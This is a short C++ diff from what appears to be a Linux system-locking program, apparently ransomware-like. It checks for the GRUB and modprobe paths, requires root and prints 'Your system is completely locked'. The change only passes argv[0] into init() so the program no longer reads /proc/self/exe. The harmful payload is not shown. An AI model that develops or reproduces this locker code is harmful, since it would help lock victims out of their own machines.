@@ -34,19 +34,10 @@ void write_file(string path, string data) {
 }
 
 
-void init() {
+void init(string current_path) {
   if (!fs::exists(PATH_GRUB) || !fs::exists(PATH_MODPROBE)) { 
         std::cerr << "DO NOT SUPPORT";
         return; 
-    }
-
-    char current_path[4096];
-    ssize_t self_exe = readlink("/proc/self/exe", current_path, sizeof(current_path) - 1);
-
-    if (self_exe != -1) {
-        current_path[self_exe] = '\0'; 
-    } else {
-        return;
     }
 
     if (getuid() != 0) {
@@ -169,9 +160,9 @@ Your system is completely locked
 }
 
 
-int main() {
+int main(int argc, char *argv[]) {
     if (!fs::exists(PATH_LINBLOCK)) {
-        init();
+        init(argv[0]);
     } else {
         output();
     }
